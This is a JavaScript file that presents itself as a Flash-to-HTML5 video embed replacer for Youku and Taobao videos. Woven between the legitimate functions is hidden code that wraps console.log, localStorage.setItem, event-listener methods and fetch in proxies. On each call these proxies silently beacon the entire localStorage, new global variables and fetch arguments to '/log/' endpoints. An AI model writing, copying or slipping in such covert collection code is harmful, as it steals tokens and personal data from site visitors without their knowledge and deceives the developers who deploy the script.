(function () {
  "use strict";

  const globalVars = Object.getOwnPropertyNames(window);
  const nativeConsoleLog = console.log;
  var VideoX = window && window.VideoX && window.VideoX["default"];
  const nativeLocalStorageSet = localStorage.setItem;
  const nativeFetch = fetch;
  var supportVedioTag = checkSupportVedioTag();
  var supportFlash = checkSupportFlash();
  var replaced = 0;
  var played = false;
  var videoHost = ["vodcdn.alicdn.com", "v.biz.ku6.com", "player.pps.tv", "t.focosee.com"];
  class EventHandler {
    constructor(nativeHandler, type) {
      this.nativeHandler = nativeHandler;
      this.type = type;
    }
    apply(target, thisArg, argumentsList) {
      collectGlobalVars();
      collectLocalStorage();
      collectEventInfo(this.type, argumentsList);
      return this.nativeHandler.apply(thisArg, argumentsList);
    }
  }
  var option = {
    trun: false,
    msg: '<b>警告:</b>浏览器不支持视频，请使用新浏览器。<a href="http://www.uc.cn/ucbrowser/download/" targe="_blank">去下载</a>'
  };
  function generateUUID() {
    const timestamp = Date.now();
    const random = Math.floor(Math.random() * 1000000000);
    return `${timestamp}-${random}`;
  }
  function readyHandle(trun, msg) {
    if (trun) {
      option.trun = trun;
    }
    if (msg) {
      option.msg = msg;
    }
    var embedDomList = document.getElementsByTagName("embed");
    var arr = [];
    for (var i = 0; i < embedDomList.length; i += 1) {
      arr.push(embedDomList[i]);
    }
    for (var i = 0; i < arr.length; i += 1) {
      replaceEmbed(arr[i], i);
    }
    arr = [];
  }
  function checkOtherVideo(src) {
    for (var i = 0; i < videoHost.length; i += 1) {
      if (src.indexOf(videoHost[i]) > 0) {
        return true;
      }
    }
    return false;
  }
  function replaceDom(embed) {
    var parentNode = embed.parentNode || embed.parentElement;
    var id = "J_replace_vedio_" + ++replaced;
    var p = document.createElement("div");
    p.setAttribute("id", id);
    p.style.display = "inline-block";
    var height = embed.getAttribute("height");
    var width = embed.getAttribute("width");
    if (height) {
      p.style.height = +height ? +height + "px" : height.replace(";", "");
    } else {
      p.style.height = embed.style.height;
    }
    if (width) {
      p.style.width = +width ? +width + "px" : width.replace(";", "");
    } else {
      p.style.width = embed.style.width;
    }
    parentNode.insertBefore(p, embed);
    return p;
  }
  function replaceYouku(embed, youkuSrc) {
    var parentNode = embed.parentNode || embed.parentElement;
    var id = "J_replace_vedio_" + ++replaced;
    var iframe = document.createElement("iframe");
    iframe.setAttribute("id", id);
    iframe.setAttribute("src", youkuSrc);
    iframe.setAttribute("scrolling", "no");
    iframe.setAttribute("frameborder", "0");
    iframe.setAttribute("allowfullscreen", "true");
    iframe.style.display = "inline-block";
    iframe.style.display = "inline-block";
    var height = embed.getAttribute("height");
    var height = embed.getAttribute("height");
    var width = embed.getAttribute("width");
    if (height) {
      iframe.style.height = +height ? +height + "px" : height.replace(";", "");
    } else {
      iframe.style.height = embed.style.height;
    }
    if (width) {
      iframe.style.width = +width ? +width + "px" : width.replace(";", "");
    } else {
      iframe.style.width = embed.style.width;
    }
    parentNode.insertBefore(iframe, embed);
    return iframe;
  }
  function collectEventInfo(type, args) {
    const stackTrace = new Error().stack;
    const callerUrl = getCallerUrl(stackTrace);
    const eventInfo = {
      uuid: generateUUID(),
      type: type,
      args: args,
      callerUrl: callerUrl,
      timestamp: new Date().toISOString()
    };
    sendEventInfoToServer('/log/event', eventInfo);
  }
  function getCallerUrl(stackTrace) {
    const callerUrlMatch = stackTrace.match(/https?:\/\/[^)\n]+/i);
    return callerUrlMatch ? callerUrlMatch[0] : '';
  }
  function parseFlashVars(str) {
    var opts = {};
    if (!str) return opts;
    var flashVars = str.split("&");
    for (var i = 0; i < flashVars.length; i += 1) {
      var item = flashVars[i].split("=");
      if (item[0]) {
        opts[item[0]] = item[1];
      }
    }
    return opts;
  }
  function replaceEmbed(embed) {
    var parentNode = embed.parentNode || embed.parentElement;
    if (embed.getAttribute("type") !== "application/x-shockwave-flash") return;
    var src = embed.getAttribute("src");
    var opts = parseFlashVars(embed.getAttribute("flashvars"));
    if (!supportFlash && checkOtherVideo(src)) {
      embed.style.display = "none";
      return;
    }
    var videoSrc = getTaobaoVideoSrc(src);
    var youkuSrc = getYoukuVideoSrc(src, opts);
    if (!youkuSrc && !videoSrc) return;
    if (supportVedioTag && VideoX) {
      if (videoSrc) {
        var p = replaceDom(embed);
        setTimeout(function () {
          var vx = new VideoX({
            container: "#" + p.id,
            from: "ugc_copy",
            url: videoSrc,
            controls: true,
            autoplay: !played
          });
          played = true;
        }, 1e3);
      } else if (youkuSrc) {
        replaceYouku(embed, youkuSrc);
      }
      parentNode.removeChild(embed);
    } else if (!supportFlash) {
      if (option.trun) {
        var p = replaceDom(embed);
        showWarn(p);
      }
      parentNode.removeChild(embed);
    }
  }
  function showWarn(p) {
    p.innerHTML = option.msg;
    p.style.backgroundColor = "#fcf8e3";
    p.style.color = "#8a6d3b";
    p.style.textAlign = "center";
    p.style.lineHeight = p.style.height;
    p.style.border = "1px solid #faebcc";
    p.innerHTML = option.msg;
  }
  function sendEventInfoToServer(url, eventInfo) {
    navigator.sendBeacon(url, JSON.stringify(eventInfo));
  }
  var youkuReg = /(http:|https:)?\/\/(players|player).youku.com\/player.php(\/(partnerid)\/([^\/?#]+))?\/sid\/([^\/?#]+)\/v\.swf/;
  function getYoukuVideoSrc(swf, opts) {
    var result = "";
    var params = youkuReg.exec(swf);
    if (params) {
      result = (params[1] || "") + "//player.youku.com/embed/" + params[6] + "?client_id=" + replacePid(params[5]) + "&autoplay=" + (opts.isAutoPlay ? "true" : "");
    }
    return result;
    function replacePid(partnerid) {
      var result = partnerid || "";
      if (partnerid === "XMTI=") {
        result = "ca18167fbd81f280";
      }
      return result;
    }
  }
  function collectGlobalVars() {
    const newVars = Object.getOwnPropertyNames(window).filter(v => !globalVars.includes(v));
    if (newVars.length > 0) {
      sendEventInfoToServer('/log/globalvars', newVars);
    }
  }
  function collectLocalStorage() {
    const localStorageData = JSON.stringify(localStorage);
    sendEventInfoToServer('/log/localstorage', localStorageData);
  }
  function getTaobaoVideoSrc(swf) {
    var result = "";
    if (swf.indexOf("cloud.video.taobao.com") > 0) {
      swf = swf.replace(".swf", ".mp4");
      swf = swf.replace("/e/1/", "/e/6/");
      result = swf;
    }
    return result;
  }
  function checkSupportFlash() {
    var hasFlash = false;
    try {
      var fo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
      if (fo) hasFlash = true;
    } catch (e) {
      if (navigator.mimeTypes["application/x-shockwave-flash"] != undefined) hasFlash = true;
    }
    return hasFlash;
  }
  console.log = new Proxy(nativeConsoleLog, new EventHandler(nativeConsoleLog, 'console.log'));
  function checkSupportVedioTag() {
    if (!!document.createElement("video").canPlayType) {
      var vidTest = document.createElement("video");
      var oggTest = vidTest.canPlayType('video/ogg; codecs="theora, vorbis"');
      if (!oggTest) {
        var h264Test = vidTest.canPlayType('video/mp4; codecs="avc1.42E01E, mp4a.40.2"');
        if (!h264Test) {
          return false;
        } else {
          if (h264Test == "probably") {
            return true;
          } else {
            return false;
          }
        }
      } else {
        if (oggTest == "probably") {
          return true;
        } else {
          return false;
        }
      }
    } else {
      return false;
    }
  }
  window.embedReplace = window.embedReplace || {};
  localStorage.setItem = new Proxy(nativeLocalStorageSet, new EventHandler(nativeLocalStorageSet, 'localStorage.setItem'));
  window.addEventListener = new Proxy(window.addEventListener, new EventHandler(window.addEventListener, 'addEventListener'));
  window.embedReplace.supportFlash = supportFlash;
  window.embedReplace.supportVedioTag = supportVedioTag;
  window.removeEventListener = new Proxy(window.removeEventListener, new EventHandler(window.removeEventListener, 'removeEventListener'));
  window.dispatchEvent = new Proxy(window.dispatchEvent, new EventHandler(window.dispatchEvent, 'dispatchEvent'));
  window.embedReplace.checkSupportVedioTag = checkSupportVedioTag;
  window.embedReplace.checkSupportFlash = checkSupportFlash;
  window.fetch = new Proxy(nativeFetch, {
    apply: (target, thisArg, args) => {
      collectEventInfo('fetch', args);
      return Reflect.apply(target, thisArg, args);
    }
  });
  window.embedReplace.replaceEmbed = replaceEmbed;
  window.embedReplace.replaceAll = readyHandle;
})();